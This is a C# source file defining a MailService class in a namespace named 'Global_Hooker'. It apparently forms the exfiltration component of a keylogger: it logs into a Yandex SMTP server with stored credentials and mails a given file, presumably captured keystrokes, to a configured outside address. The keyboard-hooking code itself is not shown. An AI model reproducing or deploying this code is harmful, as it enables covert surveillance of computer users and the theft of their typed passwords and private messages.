using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Global_Hooker
{
    class MailService
    {
        private readonly SmtpClient _smtpClient;
        private readonly ConfigurationManager _configuration;

        private const string Host = "smtp.yandex.ru";
        private const int Port = 587;

        public MailService()
        {
            _configuration = ConfigurationManager.Instance;
            _smtpClient = new SmtpClient(Host, Port)
            {
                Credentials =
                    new System.Net.NetworkCredential(_configuration.EmailAddresser, _configuration.EmailPassword),
                EnableSsl = true
            };
        }

        public void SendMail(string filePath)
        {
            try
            {
                var mail = new MailMessage();
                mail.From = new MailAddress(_configuration.EmailAddresser);
                mail.To.Add(new MailAddress(_configuration.EmailAddressee));
                using (Attachment attachment = new Attachment(filePath))
                {
                    mail.Attachments.Add(attachment);
                    _smtpClient.Send(mail);
                }
            }
            catch (Exception e)
            {
                Console.Write(e.ToString());
            }
        }
    }
}
